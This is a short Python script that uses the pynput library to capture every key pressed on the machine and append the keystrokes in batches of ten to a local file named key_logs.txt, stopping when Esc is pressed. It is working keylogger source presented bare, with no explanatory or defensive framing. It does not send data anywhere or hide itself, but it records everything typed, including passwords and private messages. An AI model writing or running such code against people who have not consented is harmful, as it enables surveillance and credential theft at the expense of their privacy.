import pynput

from pynput.keyboard import Key, Listener


count = 0
keys = []


def write_file(keys):
    with open("key_logs.txt", "a", encoding="utf-8") as f:
        for key in keys:
            try:
                f.write(key.char)
            except AttributeError:
                f.write(f"[{key}]")


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 10:
        count = 0
        write_file(keys)
        keys.clear()


def on_release(key):
    if key == Key.esc:
        raise SystemExit


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
